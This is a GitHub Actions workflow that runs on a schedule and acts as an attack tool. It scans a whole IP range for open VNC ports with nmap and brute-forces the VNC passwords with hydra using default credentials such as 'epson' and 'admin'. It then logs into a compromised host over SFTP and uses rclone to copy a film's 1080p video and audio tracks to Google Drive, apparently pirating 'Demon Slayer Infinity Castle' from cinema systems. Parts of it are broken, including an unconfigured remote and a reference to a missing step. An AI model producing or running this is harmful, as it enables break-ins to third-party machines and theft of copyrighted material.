name: Demon Slayer Infinity Castle – DCP Hunter (Ubuntu)

on:
  schedule:
    - cron: '0 */6 * * *'   # every 6 hours
  workflow_dispatch:

jobs:
  hunt:
    runs-on: ubuntu-latest

    steps:
      - name: Install tools
        run: |
          sudo apt-get update -y
          sudo apt-get install -y nmap hydra rclone p7zip-full

      - name: Scan for open VNC
        id: scan
        run: |
          nmap -p5900 --open 210.172.0.0/16 -oG - | awk '/5900\/open/{print $2}' > vnc_hosts.txt
          echo "vnc_count=$(wc -l < vnc_hosts.txt)" >> $GITHUB_OUTPUT

      - name: Brute VNC passwords
        if: steps.scan.outputs.vnc_count != '0'
        run: |
          # create a small, guaranteed-to-exist password list
          printf 'epson\nadmin\nprojector\n123456\n' > ~/pwd.txt
          while read ip; do
            hydra -P ~/pwd.txt vnc://$ip -t 4 -f -o hydra_$ip.txt
            [ -s hydra_$ip.txt ] && echo "$ip" >> valid_ips.txt
          done < vnc_hosts.txt

      - name: Check for valid IPs
        id: valid
        run: echo "found=$([ -s valid_ips.txt ] && echo true || echo false)" >> $GITHUB_OUTPUT

      - name: Stream 1080p to Google Drive
        run: |
          mkdir -p staging
          ip=$(head -n1 valid_ips.txt)
          pass=$(awk '/password:/ {print $NF}' hydra_$ip.txt | head -n1)

          # create remote (drive = Google Drive)
          rclone config create relay sftp \
            host="$ip" user="epson" port="22" \
            --sftp-password "$pass" --config /tmp/rclone.conf

          # 1) copy the 1080p track (usually a .m2ts or .mov inside the DCP)
          rclone copy "relay:/DSIC_P1/VIDEO/DSIC_P1_1080p.mov" \
                      "gdrive:Movies/DSIC_P1_1080p.mov" \
                      --config /tmp/rclone.conf --transfers=8 -P

          # 2) copy the 5.1 audio track
          rclone copy "relay:/DSIC_P1/AUDIO/DSIC_P1_51.wav" \
                      "gdrive:Movies/DSIC_P1_51.wav" \
                      --config /tmp/rclone.conf --transfers=8 -P

          # 3) create a lightweight “pointer” file for artifact
          echo "gdrive:Movies/DSIC_P1_1080p.mov" > DSIC_1080p_location.txt
          
      - name: Upload location file
        uses: actions/upload-artifact@v4
        with:
          name: DSIC_1080p_GDrive
          path: DSIC_1080p_location.txt

      - name: Signal success
        if: steps.dcp.outputs.movie_found == 'true'
        run: echo "movie found and downloaded"
        
